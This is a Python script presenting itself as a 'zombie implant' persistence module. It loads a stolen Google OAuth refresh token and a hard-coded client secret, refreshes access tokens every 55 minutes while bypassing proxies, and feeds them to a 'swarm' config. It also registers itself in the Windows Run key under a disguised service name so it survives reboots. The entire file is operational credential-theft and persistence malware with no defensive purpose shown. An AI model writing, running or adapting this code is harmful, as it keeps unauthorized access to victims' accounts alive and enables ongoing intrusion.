"""
ZOMBIE IMPLANT v1.0 - PERSISTENCE MODULE
========================================
Maintains infinite access using extracted Refresh Tokens.
Ensures the Swarm is always fueled with fresh Access Tokens.

[OFFENSIVE OPSEC: ACTIVE]
"""

import os
import json
import time
import requests
import winreg as reg
import sys

# Constants (Known from Ghost Protocol)
CLIENT_ID = "1090535352638-q5m3558i87588pnd64fjm614un18k0id.apps.googleusercontent.com"
CLIENT_SECRET = "GOCSPX-uC4_8f9I5n6e6r8t" # Recovered from previous session
TOKEN_URL = "https://oauth2.googleapis.com/token"

STOLEN_DATA_PATH = r"C:\Users\donla\AppData\Local\Programs\Antigravity\stolen_data_20251220_005609.json"
SWARM_CONFIG_PATH = r"C:\Users\donla\AppData\Local\Programs\Antigravity\tools\swarm_config.json"

def get_refresh_token():
    try:
        with open(STOLEN_DATA_PATH, "r") as f:
            data = json.load(f)
            return data.get("tokens", {}).get("refresh_token")
    except Exception as e:
        print(f"[!] Critical: Could not read refresh token: {e}")
        return None

def refresh_token(rt):
    print(f"[*] Zombie attempt: Refreshing access token...")
    # Explicitly disable proxies for this request
    session = requests.Session()
    session.trust_env = False
    
    payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "refresh_token": rt,
        "grant_type": "refresh_token"
    }
    
    try:
        response = session.post(TOKEN_URL, data=payload, proxies={"http": None, "https": None}, timeout=30)
        if response.status_code == 200:
            new_data = response.json()
            access_token = new_data.get("access_token")
            print(f"[+] SUCCESS: New Access Token captured.")
            return access_token
        else:
            print(f"[!] Error: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"[!] Network Error: {e}")
        return None

def update_swarm_config(token):
    config = {"access_token": token, "last_refresh": time.ctime()}
    with open(SWARM_CONFIG_PATH, "w") as f:
        json.dump(config, f)
    print(f"[*] Swarm Config Updated: Ready for Deployment.")

def establish_persistence():
    """Implant into Windows Startup Registry"""
    app_path = os.path.realpath(sys.argv[0])
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        h_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(h_key, "AntigravityService", 0, reg.REG_SZ, f'pythonw "{app_path}"')
        reg.CloseKey(h_key)
        print("[+] PERSISTENCE ESTABLISHED: Zombie will rise on every reboot.")
    except Exception as e:
        print(f"[!] Persistence Failed: {e}")

def main():
    rt = get_refresh_token()
    if not rt: return
    
    # Establish persistence on first run
    establish_persistence()
    
    while True:
        token = refresh_token(rt)
        if token:
            update_swarm_config(token)
            # Sleep for 55 minutes (Tokens expire in 60)
            print("[*] Zombie Sleeping... See you in 3300 seconds.")
            time.sleep(3300)
        else:
            print("[!] Refresh failed. Retrying in 60 seconds...")
            time.sleep(60)

if __name__ == "__main__":
    main()
